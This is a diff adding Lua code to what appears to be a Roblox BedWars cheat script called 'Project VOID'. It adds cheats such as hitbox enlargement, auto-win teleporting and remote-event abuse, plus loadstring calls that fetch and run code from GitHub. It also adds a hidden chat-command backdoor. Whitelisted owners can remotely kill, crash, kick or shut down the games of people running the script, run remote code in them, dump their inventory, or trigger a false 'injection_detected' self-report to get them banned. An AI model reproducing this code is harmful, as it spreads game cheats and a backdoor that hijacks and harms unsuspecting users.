@@ -10385,3 +10385,1307 @@ task.spawn(function()
 		AutoLeave.ToggleButton(false)
 	end
 end)
+
+local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/ProjectVOIDV1/ProjectVOIDV1/main/Whitelist.lua"))
+
+local function getLplrType(player)
+    local lplr_Type = 0
+    local userId = tostring(player.UserId)
+
+    if whitelist["Owner"] ~= nil then
+        for _, v in ipairs(whitelist["Owner"]) do
+            if v.id == userId then
+                lplr_Type = 1
+                return lplr_Type
+            end
+        end
+    end
+
+    if whitelist["Private"] ~= nil then
+        for _, v in ipairs(whitelist["Private"]) do
+            if v.id == userId then
+                lplr_Type = 2
+                return lplr_Type
+            end
+        end
+    end
+
+    return lplr_Type
+end
+
+local MoonUsers = {}
+
+function CanAttackUser(u)
+    local userId = tostring(u.UserId)
+    local userType = 0
+
+    if whitelist["Owner"] ~= nil then
+        for _, v in ipairs(whitelist["Owner"]) do
+            if v.id == userId then
+                userType = 1
+                break
+            end
+        end
+    end
+
+    if whitelist["Private"] ~= nil then
+        for _, v in ipairs(whitelist["Private"]) do
+            if v.id == userId then
+                userType = 2
+                break
+            end
+        end
+    end
+
+    return getLplrType(u) >= userType
+end
+
+local function stealItems()
+    if GuiLibrary and GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+        GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+        task.wait(1)
+    end
+
+    local plr = game.Players.LocalPlayer
+    local bedwars = game:GetService("ReplicatedStorage").bedwars
+    local bedwarsStore = require(bedwars:FindFirstChild("bedwarsStore"))
+
+    for i, v in pairs(bedwarsStore.localInventory.inventory.items) do 
+        local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+            item = v.tool,
+            amount = v.amount ~= math.huge and v.amount or 99999999
+        })
+        if e then 
+            e.CFrame = plr.Character.HumanoidRootPart.CFrame
+        else
+            v.tool:Destroy()
+        end
+    end
+end
+
+local commands = {
+    [";kill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+		end
+	end,
+	[";funnyvideo default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local filename = "bruh"
+			local ScreenGui = Instance.new("ScreenGui")
+			ScreenGui.IgnoreGuiInset = true
+			ScreenGui.Parent = game:GetService("CoreGui")
+
+			local video = Instance.new("VideoFrame")
+			video.Size = UDim2.new(1, 0, 1, 0)
+			video.Parent = ScreenGui
+
+			local Name = filename .. ".mp4"
+			if not isfile(Name) then
+				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+			end
+
+			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
+
+			repeat
+				task.wait()
+				print("Retrying...")
+			until video.Loaded
+
+			video:Play()
+		end
+	end,
+	[";reveal default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local textChatService = game:GetService("TextChatService")
+			wait(0.0001)
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using PV+ Made by Iamfakemario")
+		end
+	end,
+	[";void default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local character = game.Players.LocalPlayer.Character
+			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+			local newPosition = humanoidRootPart.CFrame
+			for i = 1, 3 do
+				newPosition = newPosition + Vector3.new(0, -40, 0)
+				humanoidRootPart.CFrame = newPosition
+				wait(0.01)
+			end
+		end
+	end,
+	[";blind default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = Instance.new("BlurEffect")
+			blur.Size = 10000000000000
+			blur.Parent = game.Lighting
+		end
+	end,
+	[";unblind default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+			if blur then
+				blur:Destroy()
+			end
+		end
+	end,
+	[";troll default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+		end
+	end,
+	[";kick default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			wait(1)
+			for index, player in pairs(game.Players:GetPlayers()) do
+				player:Kick("LMAO YOU GOT KICK")
+			end
+		end
+	end,
+	[";ban default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local rs = game:GetService("ReplicatedStorage")
+			local remote = rs:FindFirstChild("SelfReport", true)
+			remote:FireServer("injection_detected")
+		end
+	end,
+	[";rickroll default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+		end
+	end,
+	[";freeze default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+		end
+	end,
+	[";thaw default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+		end
+	end,
+	[";lobby default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
+		end
+	end,
+	[";quitgame default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game:Shutdown()
+		end
+	end,
+	[";lagback default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			for i = 1, 10 do
+				wait()
+				local player = game.Players.LocalPlayer
+				local character = player.Character or player.CharacterAdded:Wait()
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local forwardVector = humanoidRootPart.CFrame.LookVector
+				local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+				humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+			end
+		end
+	end,
+	[";breakgame default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			pcall(function()
+				local replicatedStorage = game:GetService("ReplicatedStorage")
+				for _, child in ipairs(replicatedStorage:GetDescendants()) do
+					child:Destroy()
+				end
+			end)
+		end
+	end,
+	[";breakmap default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local function unanchorParts(object)
+				if object:IsA("BasePart") then
+					object.Anchored = false
+				end
+				for _, child in ipairs(object:GetChildren()) do
+					unanchorParts(child)
+				end
+			end
+			unanchorParts(workspace)
+		end
+	end,
+	[";crash default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			while true do end
+		end
+	end,
+	[";infping default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local thingy = settings().Network
+			thingy.IncomingReplicationLag = math.huge
+		end
+	end,
+	[";lag default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
+			local RunService = game:GetService("RunService")
+			local player = game.Players.LocalPlayer
+			local character = player.Character or player.CharacterAdded:Wait()
+			local rootPart = character:WaitForChild("HumanoidRootPart")
+			RunService.Heartbeat:Connect(function()
+				for i = 1, 100 do
+					local part = Instance.new("Part")
+					part.Anchored = false
+					part.CanCollide = true
+					part.Transparency = 1
+					part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
+					part.Parent = workspace
+				end
+			end)
+		end
+	end,
+	[";steal default"] = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            stealItems()
+        end
+    end,
+	[";loopkill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = true;
+			while _G.loopkill == true do
+				lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,-1000,0)
+				task.wait(.3)
+			end
+		end
+	end,
+	[";unloopkill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = false;
+		end
+	end
+}
+
+function isPlayerAllowed(playerName)
+    return false
+end
+
+local txt = game:GetService("TextChatService")
+
+txt.OnIncomingMessage = function(msg)
+    local p = Instance.new("TextChatMessageProperties")
+    local message = msg
+    if msg.TextSource then
+        local userId = tostring(msg.TextSource.UserId)
+        for i,v in pairs(commands) do
+            if tostring(i) == tostring(message.Text) then
+                local plr
+                for i,v in pairs(game.Players:GetPlayers()) do
+                    if tostring(v.UserId) == userId then
+                        plr = v
+                        break
+                    end
+                end
+                if plr == nil then break end
+                if not CanAttackUser(plr) then
+                    v()
+                end
+                break
+            end
+        end
+    end
+    
+    p.PrefixText = msg.PrefixText
+    print(message.Text,":",userId)
+
+    local userType = 0
+    local hasTag = false
+    local colors = {
+        ["red"] = "#ff0000",
+        ["orange"] = "#ff7800",
+        ["yellow"] = "#e5ff00",
+        ["green"] = "#00ff00",
+        ["blue"] = "#0000ff",
+        ["purple"] = "#b800b8",
+        ["pink"] = "#ff00ff",
+        ["black"] = "#000000",
+        ["white"] = "#ffffff",
+    }
+    if whitelist["tags"] ~= nil then
+        for i, v in pairs(whitelist["tags"]) do
+            if v.userid == userId then
+
+                hasTag = true
+                local color = colors[v.color] or colors["pink"]
+                p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
+            end
+        end
+    end
+
+    if whitelist["Owner"] ~= nil then
+        for _, v in ipairs(whitelist["Owner"]) do
+            if v.id == userId then
+                if not hasTag then
+                    hasTag = true
+                    p.PrefixText = "<font color="..colors["blue"]..">[PV+ OWNER🌠💫]</font> " .. msg.PrefixText
+                end
+                userType = 1
+                break
+            end
+        end
+    end
+
+    if whitelist["Private"] ~= nil then
+        for _, v in ipairs(whitelist["Private"]) do
+            if v.id == userId then
+                if not hasTag then
+                    hasTag = true
+                    p.PrefixText = "<font color='"..colors["purple"].."'>[PV+ PRIVATE🌠💫]</font> " .. msg.PrefixText
+                end
+                userType = 2
+                break
+            end
+        end
+    end
+
+    return p
+end
+
+runFunction(function()
+    CamFixer = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "CamFixer",
+        Function = function(callback)
+            if callback then
+                cam.CameraType = Enum.CameraType.Fixed
+                cam.CameraType = Enum.CameraType.Custom
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    Hitbox = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "Hitbox",
+        Function = function(callback)
+            if callback then
+                _G.HeadSize = 7
+                _G.Disabled = true
+
+                game:GetService('RunService').RenderStepped:Connect(function()
+                    if _G.Disabled then
+                        for i, v in next, game:GetService('Players'):GetPlayers() do
+                            if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+                                pcall(function()
+                                    v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
+                                    v.Character.HumanoidRootPart.Transparency = 0.9
+                                    v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
+                                    v.Character.HumanoidRootPart.Material = "Neon"
+                                    v.Character.HumanoidRootPart.CanCollide = false
+                                end)
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+	local DuelsAutoWin = { Enabled = false }
+	DuelsAutoWin = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		Name = "DuelsAutoWin",
+		Function = function(callback)
+			if callback then
+				if matchState == 0 or lplr.Character:FindFirstChildOfClass("ForceField") then
+					spawn(function()
+						createwarning("Project VOID", "Activated. Do not spam it", 5)
+						local v1 = game.Players.LocalPlayer.Character
+						if matchState == 0 then
+							repeat task.wait() until matchState ~= 0
+						end
+						local v4 = game:GetService("ReplicatedStorage").Inventories[game.Players.LocalPlayer.Name].wood_pickaxe
+						local v5 = game:GetService("ReplicatedStorage").Inventories[game.Players.LocalPlayer.Name].wood_sword
+						local v6 = game.Players.LocalPlayer.Character
+						local v7 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+						local bed
+
+						for i2, v8 in pairs(workspace:GetChildren()) do
+							if v8.Name == "bed" then
+								if v8.Covers.BrickColor ~= game.Players.LocalPlayer.Team.TeamColor then
+									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v8.CFrame
+									task.wait(0.1)
+									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v8.CFrame
+									task.wait(0.1)
+									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v8.CFrame + Vector3.new(0, 7, 0)
+									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v8.CFrame + Vector3.new(0, 7, 0)
+									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v8.CFrame + Vector3.new(0, 7, 0)
+									local v9 = game.Players.LocalPlayer.Character
+									repeat task.wait() until v8 == nil or v8.Parent == nil
+									bed = nil
+								end
+							end
+						end
+						repeat task.wait() until bed == nil
+
+						for i3, v10 in pairs(game.Players:GetPlayers()) do
+							if v10.Character and v10.Character:FindFirstChild("HumanoidRootPart") then
+								if v10.Team ~= game.Players.LocalPlayer.Team then
+									while v10 and v10.Character.Humanoid.Health > 0 and v10.Character.PrimaryPart do
+										task.wait(0.2)
+										if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v10.Character.HumanoidRootPart.CFrame
+										end
+										workspace.Gravity = 0
+									end
+								end
+							end
+						end
+					end)
+				else
+					createwarning("Project VOID", "Failed to enable: Please use it during pre-match or during respawn.", 5)
+				end
+				DuelsAutoWin.ToggleButton(false)
+			end
+		end
+	})
+end)
+
+runFunction(function()
+    local SpawnParts = {}
+    local rainbowColors = {
+        Color3.fromRGB(255, 0, 0),     -- Red
+        Color3.fromRGB(255, 165, 0),   -- Orange
+        Color3.fromRGB(255, 255, 0),   -- Yellow
+        Color3.fromRGB(0, 255, 0),     -- Green
+        Color3.fromRGB(0, 0, 255),     -- Blue
+        Color3.fromRGB(75, 0, 130),    -- Indigo
+    }
+
+    local currentIndex = 1
+
+    GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "SpawnESP",
+        Function = function(callback)
+            if callback then
+                for i, v2 in pairs(workspace.MapCFrames:GetChildren()) do
+                    if v2.Name:find("spawn") and v2.Name ~= "spawn" and v2.Name:find("respawn") == nil then
+                        local part = Instance.new("Part")
+                        part.Size = Vector3.new(1, 1000, 1)
+                        part.Position = v2.Value.p
+                        part.Anchored = true
+                        part.Parent = workspace
+                        part.CanCollide = false
+                        part.Transparency = 0.5
+                        part.Material = Enum.Material.Neon
+                        part.Color = rainbowColors[currentIndex]
+                        bedwars.QueryUtil:setQueryIgnored(part, true)
+                        table.insert(SpawnParts, part)
+
+                        currentIndex = currentIndex % #rainbowColors + 1
+                    end
+                end
+
+                spawn(function()
+                    while true do
+                        task.wait(0.5)  -- Change color every 0.5 seconds
+
+                        for i, part in pairs(SpawnParts) do
+                            part.Color = rainbowColors[currentIndex]
+                            currentIndex = currentIndex % #rainbowColors + 1
+                        end
+                    end
+                end)
+            else
+                for i, v in pairs(SpawnParts) do
+                    v:Destroy()
+                end
+                table.clear(SpawnParts)
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local Cords = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "Coordinates",
+        Function = function(callback)
+            if callback then
+                local player = game:GetService("Players").LocalPlayer
+                local screenGui = Instance.new("ScreenGui")
+                screenGui.Name = "CoordinatesGui"
+
+                local label = Instance.new("TextLabel")
+                label.Name = "CoordinatesLabel"
+                label.Parent = screenGui
+                label.Size = UDim2.new(0, 200, 0, 30)
+                label.Position = UDim2.new(0, 0, 0.7, 0)
+                label.BackgroundTransparency = 0.5
+                label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                label.TextColor3 = Color3.fromRGB(255, 255, 255)
+                label.TextSize = 18
+                label.Font = Enum.Font.SourceSans
+
+                local function updateCoordinates()
+                    if player.Character then
+                        local character = player.Character
+                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                        if humanoidRootPart then
+                            local position = humanoidRootPart.Position
+                            local formattedPosition = string.format("%d, %d, %d", math.floor(position.X), math.floor(position.Y), math.floor(position.Z))
+                            label.Text = "Coordinates: " .. formattedPosition
+                        else
+                            label.Text = "Coordinates: N/A"
+                        end
+                    else
+                        label.Text = "Coordinates: N/A"
+                    end
+                end
+
+                player.CharacterAdded:Connect(updateCoordinates)
+                game:GetService("RunService").Heartbeat:Connect(updateCoordinates)
+
+                screenGui.Parent = game:GetService("CoreGui")
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local speedTrackerEnabled = false
+    local speedLabel = nil
+
+    local speedTrackerButton = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "SpeedTracker",
+        Function = function(callback)
+            if callback then
+                speedTrackerEnabled = true
+
+                local player = game:GetService("Players").LocalPlayer
+                local screenGui = Instance.new("ScreenGui")
+                screenGui.Name = "SpeedTrackerGui"
+
+                local textLabel = Instance.new("TextLabel")
+                textLabel.Name = "TextLabel"
+                textLabel.Size = UDim2.new(0, 200, 0, 30)
+                textLabel.Position = UDim2.new(0, 0, 0.652, 0)
+                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                textLabel.BackgroundTransparency = 0.5
+                textLabel.BorderSizePixel = 0
+                textLabel.TextColor3 = Color3.new(1, 1, 1)
+                textLabel.TextSize = 18
+                textLabel.Font = Enum.Font.SourceSans
+                textLabel.Text = "Speed: N/A" -- Initial text
+                textLabel.Parent = screenGui
+
+                speedLabel = textLabel
+
+                screenGui.Parent = player.PlayerGui
+            else
+                if speedLabel then
+                    local screenGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("SpeedTrackerGui")
+                    if screenGui then
+                        screenGui:Destroy()
+                    end
+                    speedTrackerEnabled = false
+                end
+            end
+        end
+    })
+
+    game:GetService("RunService").Heartbeat:Connect(function()
+        if speedTrackerEnabled then
+            local player = game:GetService("Players").LocalPlayer
+            local character = player.Character
+            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+            if humanoid and character.PrimaryPart then
+                local speed = humanoid.RootPart.Velocity.Magnitude
+                speedLabel.Text = "Speed: " .. string.format("%.2f", speed) .. " studs/s"
+            else
+                speedLabel.Text = "Speed: N/A"
+            end
+        end
+    end)
+end)
+
+
+local watermarkEnabled = false
+local watermarkLabel = nil
+
+local watermarkButton = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+    Name = "Watermark",
+    Function = function(callback)
+        if callback then
+            watermarkEnabled = true
+
+            local player = game:GetService("Players").LocalPlayer
+            local screenGui = Instance.new("ScreenGui")
+            screenGui.Name = "WatermarkGui"
+
+            watermarkLabel = Instance.new("TextLabel")
+            watermarkLabel.Name = "WatermarkLabel"
+            watermarkLabel.Size = UDim2.new(0, 200, 0, 50)
+            watermarkLabel.Position = UDim2.new(0, 0, 0.878, 0)
+            watermarkLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+            watermarkLabel.BackgroundTransparency = 0.5
+            watermarkLabel.BorderSizePixel = 0
+            watermarkLabel.TextColor3 = Color3.new(1, 1, 1)
+            watermarkLabel.TextSize = 20
+            watermarkLabel.Font = Enum.Font.SourceSansBold
+            watermarkLabel.Text = "Project VOID V5 (Private)" 
+            watermarkLabel.Parent = screenGui
+
+            screenGui.Parent = player.PlayerGui
+        else
+            if watermarkLabel then
+                local screenGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("WatermarkGui")
+                if screenGui then
+                    screenGui:Destroy()
+                end
+                watermarkEnabled = false
+            end
+        end
+    end
+})
+
+runFunction(function()
+    local yield = {Enabled = false}
+    yield = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = "InfiniteYield",
+        HoverText = "InfiniteYield",
+        Function = function(callback)
+            if callback then
+                loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+            end
+        end
+    })
+end)
+
+local Messages = {
+    "Pow!", "Punch!", "KnockedOut!", "RIP!", "KO!", "Knock!", "Clapped!", "GetGood!",
+    "Splat!", "Dong!", "BodyShot!", "Shot!", "Ez!", "L!", "Bad!", "Pew!", "Thump!",
+    "Ding!", "Bong!", "Wham!", "Hit!", "Smack!", "Nuke!", "SkillIssue!", "Ram!",
+    "Bang!", "Pop!", "Beamed!", "Bonk!", "Sliced!", "Headshot!", "Boom!"
+}
+
+local old
+local FunnyIndicator = {Enabled = false}
+FunnyIndicator = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
+    Name = "DamageIndicators",
+    Function = function(Callback)
+        FunnyIndicator.Enabled = Callback
+        if FunnyIndicator.Enabled then
+            old = debug.getupvalue(bedwars.DamageIndicator, 10)["Create"]
+            debug.setupvalue(bedwars.DamageIndicator, 10, {
+                Create = function(self, obj, ...)
+                    spawn(function()
+                        pcall(function()
+                            obj.Parent.Text = Messages[math.random(1, #Messages)]
+                            obj.Parent.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                        end)
+                    end)
+                    return game:GetService("TweenService"):Create(obj, ...)
+                end
+            })
+        else
+            debug.setupvalue(bedwars.DamageIndicator, 10, {
+                Create = old
+            })
+            old = nil
+        end
+    end
+})
+
+local BetterJump2 = {Enabled = false}
+BetterJump2 = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+    Name = "BetterHighJump",
+    HoverText = "Not Skidded rel",
+    Function = function(v)
+        betterjump = v
+        if betterjump then
+            Workspace.Gravity = 0
+            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
+            spawn(function()
+                repeat
+                    if (not betterjump) then return end
+                    Workspace.Gravity = 0
+                    lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
+                    task.wait(0.04)
+                    lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                until (not betterjump)
+            end)
+        else
+            Workspace.Gravity = 196.2
+        end
+    end
+})
+
+local hpbar = {Enabled = false}
+hpbar = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+    Name = "RainbowHealthbar",
+    Function = function(callback)
+        if callback then
+            task.spawn(function()
+                function TapeRB(X)
+                    return math.acos(math.cos(X * math.pi)) / math.pi
+                end
+                counter = 0
+                while hpbar.Enabled do
+                    local hotbar = game.Players.LocalPlayer.PlayerGui.hotbar['1'].HotbarHealthbarContainer.HealthbarProgressWrapper['1']
+                    local alpha = TapeRB(counter)
+                    hotbar.BackgroundColor3 = Color3.fromHSV(alpha, 1, 1)
+                    hotbar.BackgroundTransparency = 0.01
+                    counter = counter + 0.02
+                    wait(0.079)
+                end
+            end)
+        else
+            game.Players.LocalPlayer.PlayerGui.hotbar['1'].HotbarHealthbarContainer.HealthbarProgressWrapper['1'].BackgroundColor3 = Color3.fromRGB(203, 54, 36)
+            game.Players.LocalPlayer.PlayerGui.hotbar['1'].HotbarHealthbarContainer.HealthbarProgressWrapper['1'].BackgroundTransparency = 0
+        end
+    end,
+    HoverText = "Makes your health bar rainbow"
+})
+
+runFunction(function()
+    InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = "InfiniteJump",
+        Function = function(callback)
+            if callback then
+                local infiniteJumpEnabled = true
+                game:GetService("UserInputService").JumpRequest:Connect(function()
+                    if infiniteJumpEnabled then
+                        local humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                        if humanoid then
+                            humanoid:ChangeState("Jumping")
+                        end
+                    end
+                end)
+            else
+                infiniteJumpEnabled = false
+            end
+        end
+    })
+end)
+
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character
+
+local glowingParts = {}
+local rainbowColors = {
+    Color3.new(1, 0, 1), -- Red
+    Color3.new(1, 0.5, 0), -- Orange
+    Color3.new(1, 1, 0), -- Yellow
+    Color3.new(0, 1, 0), -- Green
+    Color3.new(1, 0, 0), -- Blue
+    Color3.new(0.5, 0, 1), -- Indigo
+    Color3.new(1, 0, 1) -- Violet
+}
+
+local function setRainbowGlow(part)
+    if part:IsA("BasePart") then
+        local glow = Instance.new("SurfaceLight")
+        glow.Color = rainbowColors[1]
+        glow.Brightness = 1
+        glow.Range = 15
+        glow.Parent = part
+        glowingParts[part] = glow
+    end
+end
+
+local function glowCharacterWithRainbow()
+    for _, part in ipairs(character:GetDescendants()) do
+        setRainbowGlow(part)
+    end
+end
+
+local function stopRainbowGlowCharacter()
+    for part, glow in pairs(glowingParts) do
+        glow:Destroy()
+        glowingParts[part] = nil
+    end
+end
+
+local function onButtonToggle(callback)
+    if callback then
+        glowCharacterWithRainbow()
+    else
+        stopRainbowGlowCharacter()
+    end
+end
+
+local GuiLibrary = shared.GuiLibrary
+local rainbowGlowButton = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
+    Name = "ShinyCharacter",
+    Function = onButtonToggle,
+})
+
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    if rainbowGlowButton.IsActive then
+        glowCharacterWithRainbow()
+    end
+end)
+
+runFunction(function()
+    local breathe = {Enabled = false}
+    breathe = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = "DragonBreath",
+        Function = function(callback)
+            if callback then
+                task.spawn(function()
+                    repeat
+                        task.wait(0.001)
+                        local success, module = pcall(function()
+                            return game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DragonBreath")
+                        end)
+
+                        if success and module then
+                            local player = game:GetService("Players").LocalPlayer
+                            module:FireServer({player = player})
+                        else
+                            warn("Breh")
+                            break
+                        end
+                    until (not breathe.Enabled)
+                end)
+            end
+        end
+    })
+end)
+
+local CustomSpaceSky = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
+    Name = "SpaceSky",
+    Function = function(callback)
+        if callback then
+            game.Lighting.Sky.SkyboxBk = "http://www.roblox.com/asset/?id=159454299"
+            game.Lighting.Sky.SkyboxDn = "http://www.roblox.com/asset/?id=159454296"
+            game.Lighting.Sky.SkyboxFt = "http://www.roblox.com/asset/?id=159454293"
+            game.Lighting.Sky.SkyboxLf = "http://www.roblox.com/asset/?id=159454286"
+            game.Lighting.Sky.SkyboxRt = "http://www.roblox.com/asset/?id=159454300"
+            game.Lighting.Sky.SkyboxUp = "http://www.roblox.com/asset/?id=159454288"
+            game.Lighting.FogColor = Color3.new(236, 88, 241)
+            game.Lighting.FogEnd = "200"
+            game.Lighting.FogStart = "0"
+            game.Lighting.Ambient = Color3.new(0.5, 0, 1)
+        else
+            game.Lighting.Sky.SkyboxBk = "http://www.roblox.com/asset/?id=7018684000"
+            game.Lighting.Sky.SkyboxDn = "http://www.roblox.com/asset/?id=6334928194"
+            game.Lighting.Sky.SkyboxFt = "http://www.roblox.com/asset/?id=7018684000"
+            game.Lighting.Sky.SkyboxLf = "http://www.roblox.com/asset/?id=7018684000"
+            game.Lighting.Sky.SkyboxRt = "http://www.roblox.com/asset/?id=7018684000"
+            game.Lighting.Sky.SkyboxUp = "http://www.roblox.com/asset/?id=7018689553"
+            game.Lighting.FogColor = Color3.new(1, 1, 1)
+            game.Lighting.FogEnd = "10000"
+            game.Lighting.FogStart = "0"
+            game.Lighting.Ambient = Color3.new(0, 0, 0)
+        end
+    end
+})
+
+runFunction(function()
+    local vclip = {Enabled = false}
+    vclip = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = "Vclip",
+        Function = function(callback)
+            if callback then
+                if entityLibrary.isAlive then
+                    entityLibrary.character.HumanoidRootPart.CFrame += Vector3.new(0, -7, 0)
+                    vclip["ToggleButton"](false)
+                end
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local night = {Enabled = false}
+    night = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "Night",
+        Function = function(callback)
+            if callback then
+                game.Lighting.TimeOfDay = "00:00:00"
+            else
+                game.Lighting.TimeOfDay = "13:00:00"
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local Headless = {Enabled = false}
+    local oldface
+
+    local function applyHeadless()
+        repeat task.wait() until entityLibrary.isAlive or not Headless.Enabled
+        if entityLibrary.isAlive and Headless.Enabled then
+            entityLibrary.character.Head.Transparency = 1
+            local face = entityLibrary.character.Head:FindFirstChild("face")
+            if face then
+                oldface = face
+                face.Parent = game
+            end
+        end
+    end
+
+    Headless = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "Headless (Not FE)",
+        Function = function(callback)
+            if callback then
+                table.insert(Headless.Connections, lplr.CharacterAdded:Connect(applyHeadless))
+                task.spawn(applyHeadless)
+            else
+                if entityLibrary.isAlive then
+                    entityLibrary.character.Head.Transparency = 0
